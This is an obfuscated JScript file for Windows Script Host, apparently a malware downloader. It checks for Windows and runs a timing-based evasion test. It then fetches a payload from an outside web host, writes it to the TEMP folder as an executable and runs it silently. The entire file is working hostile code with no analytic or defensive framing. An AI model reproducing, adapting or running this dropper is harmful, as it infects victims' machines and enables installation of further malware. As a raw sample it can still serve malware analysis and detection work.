var _F0 = false;
var _R = "CreateObject";
var _BG = function _UO() {return WScript[_R]("WScript"+".Shell");}(), _UV = 11;
var _C0 = "MSXML2.XMLHTTP";
var _EB = 2123213;
var _W = 0;
function _DC(_O){_BG["Run"](_O, _W, _W);};
function _Z(){return _C0 + "";};
function _PL(_TJ, _R0){_W = _W * 1; return _TJ - _R0;};
function _DR(){return _R;};
/*@cc_on
  @if (@_win32 || @_win64)
    _F0 = true;
  @end
@*/
if (_F0)
{
var _J = "";
function _LD(){return 22;};
var _A = 0; var _B = 0;
function _K()
{
var _RR = new this["Date"]();
var _G = _RR["getUTCMilliseconds"]();
WScript["Sleep"](_LD());
var _RR = new this["Date"]();
var _C = _RR["getUTCMilliseconds"]();
WScript["Sleep"](_LD());
var _RR = new this["Date"]();
var _HH = _RR["getUTCMilliseconds"]();
var _A = "_H";
_A = _PL(_C, _G);
var _B = "_AX";
_B = _PL(_HH, _C);
_J = "open";
return _PL(_A, _B);
}
var _L = false;
var _P0 = false;
for (var _J0 = _W; _J0 < _LD() * 1; _J0++){if (_K() != _W){
_L = true; 
_B = "31" + 11 * _A + _B; 
_P0 = true; 
break;
}}
function _BF() {return ((_L == true) && (_L == _P0)) ? 1 : _W;};
if (_L && _BF() && _P0){
function _LL() {return _BG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "V7yvhb1Zss.ex" + "e";};
 _CT = _Z();
 _Y = WScript[_R](_CT);
 var _P = 1;
 while (_P){
try {
	if (_P == 1)
	{
		_Y[_J]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_Y["send"]();
		_V = "Sleep";
	}
	WScript[_V](_LD() + 120); 
	if (_Y["readystate"] < 2 * 2) continue;
	_P = _W;
	function _E(_HF) {var _M0 = (1, 2, 3, 4, 5, _HF); return _M0;};
	_MT = WScript[_DR()]("ADODB.Stream");
	_CT = _MT;
	_CT[_J]();
	_CT["type"] = _E(1);
	_CT["write"](_Y["ResponseBody"]);
	_MT["position"] = _E(_W);
	_CT["Save" + "ToFile"](_LL(), 2);
	_MT["cl"+"ose"]();
	_M = _LL();
	_DC(_M);
} catch(_F){};
}
}
}

